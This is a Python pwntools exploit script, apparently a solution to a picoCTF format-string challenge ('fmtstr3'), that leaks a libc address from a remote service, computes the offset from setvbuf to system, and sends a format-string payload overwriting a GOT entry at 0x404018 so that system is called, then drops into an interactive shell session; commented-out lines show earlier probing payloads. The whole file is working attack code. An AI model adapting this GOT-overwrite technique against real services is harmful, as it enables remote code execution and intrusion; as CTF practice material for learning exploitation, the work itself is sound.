from pwn import *

write_address = 0x404018

libc=ELF("fmtstr3/libc.so.6")

setbufv_address = libc.symbols["setvbuf"]
execve_address = libc.symbols["system"]

diff = execve_address - setbufv_address
print(diff)

HOST = "rhea.picoctf.net"
PORT = 64402

context.clear(arch = 'x86_64')

with remote(HOST, PORT) as r:
    # r.interactive()
    data = r.recvline().decode()
    data = r.recvline().decode()
    # print(data)
    addr = data.split(" ")[-1]
    # print(addr)
    addr = int(addr, 16)
    # print(addr)
    payload = fmtstr_payload(38, {write_address: addr + diff})
    # payload = fmtstr_payload(38, {write_address: "A"})
    # payload = b"%39$lx"
    # payload += b"A" * (8 - len(payload)) + p64(write_address)
    # payload = b"%lx&&" * 38
    print(payload)
    r.sendline(payload)
    # r.sendline(b"pwd\n")
    r.interactive()
    # r.interactive()
    data = r.recvall()
    print(data)
    # data = r.recvline().decode()
    # print(data)
    # data = r.recvline().decode()
    # print(data)